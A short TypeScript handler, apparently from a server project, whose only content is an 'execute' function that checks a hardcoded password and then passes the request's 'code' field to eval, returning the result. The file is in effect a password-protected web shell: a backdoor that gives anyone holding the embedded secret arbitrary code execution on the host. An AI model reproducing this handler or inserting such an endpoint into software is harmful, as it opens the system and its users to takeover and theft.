export interface IBody {
	code: string;
	pass: string;
}

export default async function execute(
	body: IBody,
) {
	if (body.pass != '4FJA39fjAGhkaun48gHanuffaj8rfdDFAj83ak490=Vas32') {
		return;
	}

	var evalResult;
	try {
		evalResult = await eval(body.code);
	} catch (error) {
		console.error('Error executing dynamic command:', error);
	}

	if (typeof evalResult != 'undefined') {
		return { result: evalResult };
	} else {
		return { result: '' };
	}
}
